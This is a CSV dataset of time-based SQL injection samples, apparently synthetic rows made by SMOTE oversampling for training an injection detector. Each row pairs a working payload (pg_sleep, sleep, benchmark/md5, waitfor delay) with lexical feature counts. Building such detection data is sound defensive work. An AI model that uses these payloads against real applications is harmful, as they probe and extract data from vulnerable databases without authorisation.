id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000126,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.5398128468750878,69.77674774584149,22.776747745841487,3.368116041497275,19.0,10.0,31.0,9.776747745841487,0.2723067894055925,0.14331936284504868,0.4442900248196509,0.1400838229297079,0.0,0.7767477458414861,2.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,0.0,3.0,0.0,0.7767477458414861,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000127,attack,time,"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000146,0.27307826257880585,69.14519649981554,27.145196499815537,3.819990429699701,16.0,21.0,24.0,8.145196499815539,0.23140307577700858,0.30371653695732376,0.3471046136655128,0.11777577360015483,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.1451964998155383,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000128,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000006,0.02374687846246053,76.91073550142576,24.0,3.373112441076714,16.0,18.0,33.92858840114061,8.982147100285152,0.20804982539271066,0.23405605356679948,0.44111405119757413,0.11678006984291574,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.982147100285152,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000129,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000036,0.6839410613802208,81.3016213156129,19.674594671096777,2.987078140675212,27.0,2.0,40.3016213156129,12.0,0.3322702714997696,0.02461261270368663,0.4954414395744239,0.14767567622211983,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.325405328903225,0.6745946710967754,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000130,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000018,2.0490315343332512,73.46233431078338,27.53766568921662,3.850381537668909,19.0,22.0,25.0,7.462334310783381,0.2586478430387108,0.29948697615008624,0.34032610926146156,0.1015390715497414,0.0,0.0,0.9246686215667606,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.9246686215667603,0.0,0.0,0.4623343107833803,0.5376656892166197,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,0.9164627569970024,69.23562117588943,18.471242351778862,2.8737274775995196,20.23562117588943,2.0,36.0,11.0,0.2921313944576853,0.028892596144584268,0.5200667306025168,0.1589092787952135,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.3821894120552842,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3821894120552844
SMOTE_000132,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000072,0.7763785206857571,69.80289383785446,24.19710616214554,3.6069811296383816,23.0,10.0,27.0,9.802893837854459,0.32956387869551895,0.14328864291109522,0.38687933585995704,0.14026814253342876,2.8028938378544597,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000133,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000055,0.25923770646242056,66.89315434957633,25.89315434957633,3.7136988236272463,15.0,21.0,24.0,6.893154349576331,0.22424303137864204,0.31394024393009884,0.35878885020582724,0.10302787448543191,0.0,0.8931543495763311,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,0.8931543495763312,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000011,0.8722096276969269,65.53773783839208,19.53773783839208,2.9009004646484438,11.0,10.0,34.0,10.537737838392077,0.16785195426053312,0.15259268569139375,0.5188151313507388,0.16074022869733434,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.5377378383920778,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000065,0.12659913103349432,73.41810819227544,25.832756723089823,3.5632162224164268,16.0,18.0,30.334486553820355,9.083621638455089,0.21800320845163204,0.24525360950808606,0.4130443049983531,0.12369887704192878,0.0,1.0,0.0,0.0,0.0,2.0,0.0,4.083621638455089,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000307,0.32956687258348355,65.12588080738735,22.125880807387354,3.351278094904601,19.125880807387354,10.0,29.0,7.0,0.2936574632027549,0.15355272539070547,0.44530290363304587,0.10748690777349383,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.12588080738735352,0.8741191926126466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000137,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000081,0.901591213884836,84.51508951460173,19.515089514601733,2.922811545806349,27.0,2.0,43.0,12.515089514601733,0.31948075393638,0.02366524103232444,0.5088026821949755,0.14805132283632,0.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.5150895146017338,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000138,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000217,0.44532645805536936,83.04251037893886,19.15958160351019,2.9080974963301456,27.0,2.0,42.36167358595923,11.680836792979616,0.3253742704164608,0.024101797808626715,0.5100049809105929,0.14051895086431954,0.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.840418396489808,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8404183964898084,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000139,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000194,0.154923714324608,81.53998338485233,27.942497923106544,3.591205653229953,16.0,21.0,33.65498753863925,10.884995846213084,0.19633491526736366,0.2576895762884148,0.4125493643842187,0.13342614406000283,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.942497923106542,0.9424979231065418,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000064,0.13970656885864963,72.9432056358631,24.113588728273815,3.5543453827652365,16.886411271726185,19.113588728273815,28.0,8.943205635863094,0.23148278672495035,0.26205690070064486,0.3838642013310185,0.12259611124338621,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.9432056358630936,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000230,0.6811190440281832,72.2483271561079,23.2550185316763,3.5023475773866726,21.2483271561079,10.0,30.0,11.0,0.2940762338206817,0.13841642474104282,0.4152492742231284,0.1522580672151471,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.2483271561079003,0.7516728438920997,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,time,"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000146,0.6588008269424193,68.71948602642611,26.71948602642611,3.7933064041042273,15.719486026426111,21.28051397357389,24.0,7.71948602642611,0.2287154218671321,0.30972852890487,0.3492609410412987,0.1122951081866992,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.7194860264261096,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000223,0.4982641822284523,83.20732787825614,18.207327878256134,2.8456935731055375,27.0,2.0,43.0,11.207327878256134,0.32449829995511825,0.024036911107786538,0.5167935888174106,0.1346712001196847,0.0,0.20732787825613475,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,0.0,0.2073278782561346,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000144,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000010,0.0002526119666726428,70.0,28.0,3.8657762744610458,16.0,21.0,24.0,9.0,0.22857142857142856,0.3,0.34285714285714286,0.12857142857142856,8.140277577894928e-05,0.9999185972242209,0.0,0.0,0.0,1.0,0.0,4.0,1.0,0.0,1.0,1.0,8.140277577900479e-05,0.999918597224221,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000145,attack,time,"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000237,0.14690746620115555,65.92213800024285,23.922138000242853,3.5490598356258167,19.0,10.0,27.0,9.922138000242853,0.2882236312343557,0.15169664801808194,0.40958094964882125,0.1504987710987412,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.0,0.9221380002428534,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R000295,0.20750091814245664,67.93972647464305,20.0,3.002423104877599,21.758905898572227,2.0,34.12054705071389,10.060273525356942,0.32022204097031703,0.029438223672237473,0.5022490121401845,0.1480907232172611,0.0,3.999999999999999,0.0,0.0,0.0,0.06027352535694286,0.0,6.0,0.0,0.0,0.0,0.06027352535694308,0.0,1.0,0.0,0.0,0.0,0.06027352535694297,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000053,0.680673333143968,84.25567445812698,27.488651083746056,3.733667035880716,30.255674458126972,10.0,33.0,11.0,0.359076529515246,0.11868953157125073,0.39167545418512745,0.13055848472837583,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.255674458126971,0.744325541873029,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000148,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,0.726231672034393,82.08995193296765,27.0,3.6406280926687753,23.0,15.0,32.50567308540084,11.584278847566807,0.2806834246669297,0.1830544073914759,0.39514840039294175,0.1411137675486526,0.0,3.0,0.0,0.0,0.0,1.0,0.0,5.584278847566807,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000102,1.2163407232972057,73.31466112340118,17.062932224680235,2.7045692703873554,19.0,2.0,40.25172889872094,12.062932224680235,0.2603735744071225,0.027407744674433937,0.5478487489952077,0.16436993192323587,4.0,0.0,0.0,0.0,0.0,1.0,0.0,7.062932224680236,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000167,0.46100494952240645,70.69908254754658,25.0,3.676707454071242,17.0,19.0,25.35926603803727,9.339816509509317,0.24071985834150178,0.2690398416757961,0.3582082599850085,0.1320320399976936,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.339816509509317,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000181,0.08047078862874549,66.0,26.09518775054288,3.9800078408221404,23.0,12.0,21.0,10.0,0.3484848484848485,0.18181818181818182,0.3181818181818182,0.15151515151515152,2.9682707498190393,0.03172925018096051,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.031729250180960455,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",nearest_attack_euclidean,R000170,0.09628471381458666,68.34616704280813,18.028847253567346,2.8530645919683626,19.057694507134688,2.0,36.23077802853876,11.05769450713469,0.2789239067411405,0.029284497410732302,0.5300056787499159,0.1617859170982113,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,6.0576945071346895,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.9711527464326557,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9711527464326553
SMOTE_000153,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000210,0.8988652347531003,76.74075387216718,25.87037693608359,3.7487556349847333,26.305565404125385,10.0,27.435188468041794,13.0,0.3420720575912007,0.13053694157081577,0.357692976795923,0.16969802404206052,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,0.2175942340208975,0.21759423402089756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.435188468041795
SMOTE_000154,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000190,1.3203903643011372,67.24141826934833,18.54023637822472,2.77803064067896,11.0,10.0,36.160945512898884,10.080472756449442,0.16391616049936794,0.14901469136306178,0.5375206008186798,0.14954854731889047,0.0,0.5402363782247208,0.0,0.0,0.0,1.0,0.0,6.540236378224721,0.0,0.0,1.0,1.0,0.0,0.5402363782247208,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",nearest_attack_euclidean,R000257,0.8280960376311726,82.30221990354579,23.093340289362644,3.3091125902870147,21.302219903545783,10.0,38.0,13.0,0.2588062612571691,0.12150717028570998,0.46172724708569796,0.157959321371423,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.3022199035457849,0.6977800964542151,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000212,0.48485419032818616,72.51840226484344,23.0,3.5698547932633,24.518402264843445,10.0,27.0,11.0,0.3380056547776356,0.13791548858799257,0.37237181918757994,0.15170703744679181,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.24079886757827734,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2407988675782775
SMOTE_000157,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000171,0.4729949971683882,81.80325743397944,22.803257433979446,3.1112206008336987,19.0,10.0,41.0,11.803257433979445,0.23227011574140177,0.12224742933757987,0.5012144602840776,0.14426799463694084,0.0,0.8032574339794448,2.0,0.0,0.0,1.0,0.0,7.0,0.0,1.0,0.0,3.0,0.0,0.8032574339794449,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
